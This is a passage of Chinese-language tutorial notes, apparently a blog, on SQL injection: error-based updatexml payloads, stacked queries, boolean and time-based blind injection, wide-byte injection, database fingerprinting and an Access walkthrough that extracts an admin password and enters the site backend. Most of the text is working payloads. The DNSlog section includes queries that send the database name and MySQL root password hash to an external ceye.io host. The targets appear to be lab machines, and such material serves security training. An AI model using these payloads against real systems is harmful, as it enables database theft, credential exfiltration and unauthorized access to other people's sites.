COLUMN_NAME <span class="keyword">FROM</span> information_schema.COLUMNS;</span><br><span class="line"></span><br><span class="line">#<span class="number">6</span>、获取表的数据</span><br><span class="line"><span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure>



<h3 id="报错函数注入"><a href="#报错函数注入" class="headerlink" title="报错函数注入"></a>报错函数注入</h3><p>报错注入顾名思义主要是利用<strong>数据库报错</strong>来进行判断是否存在注入点，如果不符合数据库语法规则就会产生错误</p>
<p>常用函数：</p>
<p>​	updatexml（）	:函数是MYSQL对XML文档数据进行查询和修改的XPATH函数.</p>
<p>​	extractvalue（）     :函数也是MYSQL对XML文档数据进行查询的XPATH函数.<br>​	floor（）		   :MYSQL中用来取整的函数.</p>
<p>典型网站：<a target="_blank" rel="noopener" href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_search.php">http://192.168.138.130:90/pikachu/vul/sqli/sqli_search.php</a></p>
<p>updatexml实战测试：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">1</span>、爆数据库版本信息</span><br><span class="line">a\<span class="operator">%</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#2、爆数据库当前用户</span></span><br><span class="line"><span class="string">a\%&#x27;</span> <span class="keyword">and</span>  updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)#  </span><br><span class="line"></span><br><span class="line">#<span class="number">3</span>、爆数据库</span><br><span class="line">a\<span class="operator">%</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#4、爆表,但是反馈回的错误表示只能显示一行，所以采用limit来一行一行显示</span></span><br><span class="line"><span class="string">a\%&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pikachu&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>) #</span><br><span class="line"></span><br><span class="line">#<span class="number">5</span>、爆字段</span><br><span class="line">a\<span class="operator">%</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;limit 2,1)),0)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#6、爆字段内容</span></span><br><span class="line"><span class="string">a\%&#x27;</span> <span class="keyword">and</span>  updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)#</span><br></pre></td></tr></table></figure>













<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>c</p>
<blockquote>
<p>与union区别：</p>
<p>堆叠注入方式和union联合注入方式类似，都是实现多个SQL语句命令拼接，同时执行操作，但是union联合注入只能实现多个select语句拼接，不能实现其他语句拼接，然而堆叠注入，还可以实现拼接其他SQL类型语句，实现操作数据库。</p>
</blockquote>
<p>PS：需要关注用户权限  </p>
<p>举例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>新建一个表</span><br><span class="line"> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">create table</span> test <span class="keyword">like</span> users;</span><br><span class="line"> </span><br><span class="line"><span class="number">2.</span>删除上面新建的test表</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">drop</span> <span class="keyword">table</span> test;</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>查询数据</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure>





<h3 id="盲注方式"><a href="#盲注方式" class="headerlink" title="盲注方式"></a>盲注方式</h3><p>适用场景：应用程序就会返回一个“通用的”的页面，或者重定向一个通用页面（可能为网站首页）。</p>
<h4 id="基于布尔类型的SQL盲注"><a href="#基于布尔类型的SQL盲注" class="headerlink" title="基于布尔类型的SQL盲注"></a>基于布尔类型的SQL盲注</h4><ul>
<li>页面仅返回两种状态（如登录成功&#x2F;失败、数据存在&#x2F;不存在）</li>
<li>无法通过联合查询或报错注入直接获取数据</li>
</ul>
<p>select ascii(substr(database(),1,1))&gt;xx;<br>通过对比ascii码的长度，判断出数据库表名的第一个字符。</p>
<p>database() – 输出数据库名称信息  		  pikachu<br>1,1        – 取出数据库名称第一个字符		p<br>substr()   – 数据库名称字符调取出来  	     p<br>ascii	   – 将字符信息转成编码数值   	    112（是可以识别，也不会显示）</p>
<p>&gt;113 &lt;111 &#x3D;112  – 通过112编码反向处理 112 - p（确认）</p>
<p>vince’ and ascii(substr(database(),1,1))&#x3D;112#  – 推断出数据库名称第一个字母 p </p>
<p><strong>流程举例</strong></p>
<p>1、判断注入点以及闭合方式</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>  <span class="comment">-- 正常响应（True）</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span>  <span class="comment">-- 异常响应（False）</span></span><br></pre></td></tr></table></figure>



<p>2、获取数据库名</p>
<p>①判断数据库名长度</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())=8 --+</span></span><br></pre></td></tr></table></figure>

<p>通过二分法逐步调整数值（如 &gt;10、&lt;5）最终确定长度。</p>
<p>②逐个字符猜解数据库名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))=115 --+</span></span><br></pre></td></tr></table></figure>

<p>通过ASCII码逐个字符判断（substr(database(),n,1) 截取第n位字符）</p>
<p>3、获取表名</p>
<p>①判断表数量及表名长度</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=2 --+</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">6</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>②逐字符猜解表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=109 --+</span></span><br></pre></td></tr></table></figure>



<p>4、获取字段名</p>
<p>①判断字符数量及字段长度</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;)=3 --+</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">4</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>②逐字符猜解字段名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1),1,1))=105 --+</span></span><br></pre></td></tr></table></figure>



<p>5、提取数据内容</p>
<p>①判断数据长度</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select username from users limit 0,1))=5 --+</span></span><br></pre></td></tr></table></figure>

<p>②逐字符猜解数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select username from users limit 0,1),1,1))=97 --+</span></span><br></pre></td></tr></table></figure>











<h4 id="基于时间类型的SQL盲注"><a href="#基于时间类型的SQL盲注" class="headerlink" title="基于时间类型的SQL盲注"></a>基于时间类型的SQL盲注</h4><p>基于时间类型的SQL盲注（Time-Based Blind SQL Injection）是一种通过观察数据库响应时间差异来推断信息的注入技术，常用于无法直接获取数据回显的场景。</p>
<p>常用延时函数：</p>
<ul>
<li>MySQL：SLEEP(5)、BENCHMARK(10000000,MD5(‘test’)) </li>
<li>SQL Server：WAITFOR DELAY ‘0:0:5’ </li>
<li>PostgreSQL：PG_SLEEP(5)</li>
</ul>
<p>测试方法：</p>
<p><strong>一、判断注入点及注入类型</strong></p>
<ul>
<li>基础测试</li>
</ul>
<p>在参数后添加延时函数，观察页面响应时间是否显著增加：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND SLEEP(5)--</span><br></pre></td></tr></table></figure>

<p>如果页面响应延迟约5秒，则可能存在时间盲注漏洞。</p>
<ul>
<li><p>闭合方式测试</p>
<p>根据参数闭合方式调整Payload（如单引号、双引号等）：</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; OR IF(1=1,SLEEP(5),0)--</span><br></pre></td></tr></table></figure>





<p><strong>二、获取数据库信息</strong> </p>
<p>1.获取数据库名 </p>
<p>判断数据库名长度  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND IF(LENGTH(DATABASE())=N, SLEEP(5),0)-- </span><br></pre></td></tr></table></figure>

<p> 逐步替换N，直到响应延迟，确定长度。 </p>
<p>​	逐字符猜解数据库名  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND IF(ASCII(SUBSTR(DATABASE(),1,1))=N, SLEEP(5),0)-- </span><br></pre></td></tr></table></figure>

<p>替换N为ASCII码（如97对应字符a），逐个字符猜解。  </p>
<p>2.获取表名</p>
<p> 猜解表数量  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())=N, SLEEP(5),0)-- </span><br></pre></td></tr></table></figure>

<p> 逐表猜解表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1),1,1))=N, SLEEP(5),0)-- </span><br></pre></td></tr></table></figure>

<p>通过LIMIT遍历所有表，逐字符猜解表名。  </p>
<p>3.获取字段名 </p>
<p>猜解字段数量 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_name=&#x27;users&#x27;)=N, SLEEP(5),0)-- </span><br></pre></td></tr></table></figure>

<p>逐字段猜解名称 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND IF(ASCII(SUBSTR((SELECT columnname FROM informationschema.columns WHERE table_name=&#x27;users&#x27; LIMIT 0,1),1,1))=N, SLEEP(5),0)- </span><br></pre></td></tr></table></figure>



<p>4.提取数据 </p>
<p>猜解字段内容 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND IF(ASCII(SUBSTR((SELECT username FROM users LIMIT 0,1),1,1))=N, SLEEP(5),0)-</span><br></pre></td></tr></table></figure>











<h4 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xy--1/p/12896599.html">DNSlog注入学习 - Lushun - 博客园</a></p>
<p>以sql盲注为例，后端数据库用的mysql数据库，说一下用dnslog回显只能用于windows系统，为什么呢。因为在利用sql盲注进行DNSlog回显时，需要用到load_file函数，这个函数可以进行DNS请求。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and if((select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.zs69k2.ceye.io\\abc&#x27;))),1,0)--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/oldboy/1884700-20210210181611688-1713394196.png" alt="img"></p>
<p>利用concat()函数将查询的数据库名和域名拼接，执行后查看DNSlog</p>
<p><img src="/img/oldboy/1884700-20210210181632406-1270734005.png" alt="img"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span> LIMIT <span class="number">1</span>),<span class="string">&#x27;.mysql.ip.port.b182oj.ceye.io\\abc&#x27;</span>));</span><br></pre></td></tr></table></figure>



<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>当php开启magic_quotes_gpc（魔术引号开关，可以将SQL注入语句中的单引号转换为字符信息）宽字节注入可以在开启魔术引号开启之后，还原引号的功能</p>
<p>magic_quotes_gpc：通过在引号’前面添加转义字符”\“使引号’失去含义</p>
<p><strong>思路：</strong></p>
<p>&#39; -&gt; url编码 -&gt; %5c%27 -&gt; %df%5c %27  -&gt; 縗’</p>
<p>%df 	&#x3D;&#x3D; ß<br>%df%5c	&#x3D;&#x3D; 縗</p>
<p>通过在%5c前面添加%df从而使%27逃匿出来，组成为<u>%df%5c%</u>27</p>
<p>注意：宽字节注入时，需要确定数据库的字符集为GBK编码</p>
<h2 id="实战应用"><a href="#实战应用" class="headerlink" title="实战应用"></a>实战应用</h2><h3 id="数据库类型确认方式"><a href="#数据库类型确认方式" class="headerlink" title="数据库类型确认方式"></a>数据库类型确认方式</h3><h4 id="使用内置变量爆数据库类型"><a href="#使用内置变量爆数据库类型" class="headerlink" title="使用内置变量爆数据库类型"></a>使用内置变量爆数据库类型</h4><p>“User”是SQL Server的一个内置变量，它的值是当前连接的用户名，其变量类型为“nvarchar”字符型。通过提交查询该变量，根据返回的出错信息即可得知数据库类型。</p>
<p>使用语句：</p>
<p>​	and user&gt;0</p>
<p>​	该查询语句会将user对应的nvarchar型值与int数字型的0进行对比，两个数据类型不一致，因此会返回出错信息。</p>
<p><strong>1、MsSQL报错信息：</strong></p>
<p>​	Microsoft OLE DB Provider for SQL Server 错误’80040e21’</p>
<p>​	将nvarchar值’****’转换为数据类型为int的列时发生语法错误。</p>
<p><strong>2、Access报错信息：</strong></p>
<p>​	Microsoft OLE DB Provider Drivers ODBC Drivers 错误 ‘80040e21’</p>
<p>​	ODBC 驱动程序不支持所需的属性。 </p>
<p><strong>3、Mysql报错信息：</strong></p>
<p>​	<strong>Warning</strong>:  mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>C:\phpstudy\WWW\mysql\sql.php</strong> on line 12</p>
<h4 id="内置数据表爆数据库类型"><a href="#内置数据表爆数据库类型" class="headerlink" title="内置数据表爆数据库类型"></a>内置数据表爆数据库类型</h4><p>如果服务器IIS不允许返回错误提示，通常可以通过数据库内置的系统数据表来进行判断。在注入点后提交如下查询语句。</p>
<p>and  (select count(*)  from sysobjects)&gt;0</p>
<p>and (select count(*)  from msysobjects)&gt;0</p>
<p><strong>1、MsSQL报错信息：</strong></p>
<p>​	在MS SQL Serve:存在系统表[sysobjects]，不存在[msysobjects]系统表</p>
<p>​	Microsoft OLE DB Provider for SQL Server 错误 ‘80040e37’</p>
<p>​	对象名 ‘msysobjects’ 无效。</p>
<p>​	&#x2F;home&#x2F;yz&#x2F;yu&#x2F;show.asp, 行 8</p>
<p><strong>2、Access报错信息：</strong></p>
<p>​	Access存在系统表[msysobjects]，不存在“sysobjects”表。</p>
<p>​	Microsoft OLE DB Provider for ODBC Drivers 错误 ‘80040e37’</p>
<p>​	&#x2F;home&#x2F;yz&#x2F;yu&#x2F;show.asp, 行 8</p>
<p>​	[Microsoft][ODBC Microsoft Access Driver] Microsoft Jet数据库引擎找不到输入表或查询’sysobjects’。确定它是否存在，以及它的名称的拼写是否正确。</p>
<p><strong>3、Mysql报错信息：</strong></p>
<p>​	<strong>Warning</strong>:  mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>C:\phpstudy\WWW\mysql\sql.php</strong> on line 12</p>
<h3 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h3><h4 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h4><h5 id="爆出数据库类型"><a href="#爆出数据库类型" class="headerlink" title="爆出数据库类型"></a>爆出数据库类型</h5><p>典型网站：<a target="_blank" rel="noopener" href="http://192.168.138.130:81/news_view.asp?id=14">http://192.168.138.130:81/news_view.asp?id=14</a></p>
<p>通过方法一：</p>
<p>​	<a target="_blank" rel="noopener" href="http://192.168.138.130:81/news_view.asp?id=14%5C%20and%5C%20user%5C%3E0">http://192.168.138.130:81/news_view.asp?id=14\%20and\%20user\%3E0</a></p>
<p>​	Microsoft OLE DB Provider for ODBC Drivers 错误 ‘80040e21’</p>
<p>​	ODBC 驱动程序不支持所需的属性。</p>
<p>​	&#x2F;news_view.asp，行 20 </p>
<p>可以判断出改数据库类型为Access数据库</p>
<h5 id="猜解数据库表名"><a href="#猜解数据库表名" class="headerlink" title="猜解数据库表名"></a>猜解数据库表名</h5><p>​	可在注入点后提交如下语句进行查询。</p>
<p>​	and exists(select *  from 数据库表名 )</p>
<p>​	或者</p>
<p>​	and (select count(*) from 数据库表名 )&gt;&#x3D;0</p>
<p>​	上面的语句是判断数据库中是否存在指定数据库表名。如果页面返回出错，那么可更换其他常见数据库表名继续进行查询。</p>
<h5 id="猜解表字段名及长度"><a href="#猜解表字段名及长度" class="headerlink" title="猜解表字段名及长度"></a>猜解表字段名及长度</h5><p>​	可在注入点后提交如下语句查询。</p>
<p>​	and exists(select 字段名  from 数据库表名 )</p>
<p>​	或者</p>
<p>​	and (select count(字段名) from 数据库表名 )&gt;&#x3D;0</p>
<p>​	如果存在此字段名，返回页面正常，否则可更换字段名继续进行猜测。</p>
<p>​	猜解字段长度，可提交如下查询语句。</p>
<p>​	当提交&gt;n-1时正常，而提交到&gt;n时返回出错，那么说明字段长度为n。</p>
<p>​	and (select top 1 len(字段名) from 数据库表名 )&gt;1</p>
<p>​	and (select top 1 len(字段名) from 数据库表名 )&gt;2</p>
<p>​	…</p>
<p>​	and (select top 1 len(字段名) from 数据库表名 )&gt;n-1</p>
<p>​	and (select top 1 len(字段名) from 数据库表名 )&gt;n</p>
<p>​	当提交&gt;n-1时正常，而提交到&gt;n时返回出错，那么说明字段长度为n。</p>
<h5 id="猜解字段值"><a href="#猜解字段值" class="headerlink" title="猜解字段值"></a>猜解字段值</h5><p>​	猜字段的ascii值，可在注入点后提交如下查询语句。</p>
<p>​	and (select top 1 asc(mid(字段名,1,1)) from 数据库表名 )&gt;0</p>
<p>​	and (select top 1 asc(mid(字段名,1,1)) from 数据库表名 )&gt;1</p>
<p>​	…</p>
<p>​	and (select top 1 asc(mid(字段名,1,1)) from 数据库表名 )&gt;n-1</p>
<p>​	and (select top 1 asc(mid(字段名,1,1)) from 数据库表名 )&gt;n</p>
<p>​	当提交&gt;n-I时正常，而提交到&gt;n时返回出错，那么说明字段值的ASCII码为n。反查ASCII码对应的字符，就可得到字段值的第一位字符。再继续提交如下查询。</p>
<p>​	and (select top 1 asc(mid(字段名,2,1)) from 数据库表名 )&gt;0</p>
<p>​	用与上面相同的方法，可得到第二位字符。再继续进行查询，直接猜解出字段的所有字符值为止。</p>
<h4 id="Access注入实战案例"><a href="#Access注入实战案例" class="headerlink" title="Access注入实战案例"></a>Access注入实战案例</h4><p>案例地址：<a target="_blank" rel="noopener" href="http://192.168.138.130:81/news_view.asp?id=14">http://192.168.138.130:81/news_view.asp?id=14</a></p>
<h5 id="猜解数据库表名和字段"><a href="#猜解数据库表名和字段" class="headerlink" title="猜解数据库表名和字段"></a>猜解数据库表名和字段</h5><p>首先来猜解数据库表名，提交如下网址。</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and exists(select * from users)</p>
<p>返回错误信息，说明users表不存在，继续提交。</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and exists(select * from admin)</p>
<p>还是返回错误信息，说明admin表不存在，继续提交。</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and exists(select * from administrator)</p>
<p>注入错误页面响应：</p>
<p><img src="/img/oldboy/1-18.png"></p>
<p>注入正确页面响应：</p>
<p><img src="/img/oldboy/1-19.png"></p>
<p>继续猜测字段并提交。</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and exists(select username from administrator)</p>
<p>返回错误信息，说明不存在username字段，继续提交。</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and exists(select user_name from administrator)</p>
<p>返回正常页面，administrator表中存在字段user_name</p>
<p><img src="/img/oldboy/1-20.png"></p>
<h5 id="猜解字段长度"><a href="#猜解字段长度" class="headerlink" title="猜解字段长度"></a>猜解字段长度</h5><p>再继续猜测第一个字段内容长度。</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 len(user_name) from administrator)&gt;1&#x2F;&#x2F;正常</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 len(user_name) from administrator)&gt;2  &#x2F;&#x2F;正常</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 len(user_name) from administrator)&gt;4  &#x2F;&#x2F;正常</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 len(user_name) from administrator)&gt;5  &#x2F;&#x2F;报错</p>
<p><img src="/img/oldboy/1-21.png"></p>
<h5 id="猜解字段内容"><a href="#猜解字段内容" class="headerlink" title="猜解字段内容"></a>猜解字段内容</h5><p>现在猜解字段内容并提交。</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;0  &#x2F;&#x2F;返回正常页面</p>
<p>说明ASCII值大于0 ,字段值应该为字母，如果是小于0那么说明是汉字，下面我们继续猜解。</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;500  &#x2F;&#x2F;返回错误页面</p>
<p>说明字段对应的ASCll值在0和500之间。继续提交。</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;100  &#x2F;&#x2F;返回错误页面</p>
<p>说明字段对应的ASCll值在0和100之间。继续提交。</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;90  &#x2F;&#x2F;返回正常页面</p>
<p>说明字段对应的ASCll值在90和100之间。继续提交。</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;96  &#x2F;&#x2F;返回正常页面</p>
<p>说明字段对应的ASCll值在96和100之间。继续提交。</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;97  &#x2F;&#x2F;返回错误页面</p>
<p>说明administrator表中的user_name字段的第一位ASCII值为97。通过反查ASCII值对应的字母，得到字符值为“a”接着第二位查询。</p>
<p><img src="/img/oldboy/1-22.png"></p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,2,1)) from administrator)&gt;99  &#x2F;&#x2F;返回正常页面(注：查第二个字母的时候记得把user_name后面的1变成2)</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,2,1)) from administrator)&gt;100  &#x2F;&#x2F;返回错误页面</p>
<p>用同样的方法，可猜解user_name字段值和password值,最终得到如下结果:</p>
<p><img src="/img/oldboy/1-23.png"></p>
<h5 id="获取后台系统"><a href="#获取后台系统" class="headerlink" title="获取后台系统"></a>获取后台系统</h5><p>得到管理员用户名和密码后，登录后台:<a target="_blank" rel="noopener" href="http://192.168.1.55:901/admin/index.asp%EF%BC%8C%E8%BE%93%E5%85%A5%E7%8C%9C%E8%A7%A3%E5%87%BA%E6%9D%A5%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81.%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%88%90%E5%8A%9F%E8%BF%9B%E5%85%A5%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E9%A1%B5%E9%9D%A2%E3%80%82">http://192.168.1.55:901/admin/index.asp，输入猜解出来的用户名和密码.就可以成功进入网站后台页面。</a></p>
<p>&#x3D;&#x3D;小提示: access数据库都是存放在网站目录下，后缀格式为mdb，asp，asa,可以通过一些暴库手段、目录猜解等直接下载数据库，如果是MSSQL、MYSQL等，一般数据库是存储在数据库安装路径下，后缀格式为myi，myd，frm，mdf 不能通过下载得到库。除非走狗屎运，对方管理员把网站库备份在网站目录下。&#x3D;&#x3D;</p>
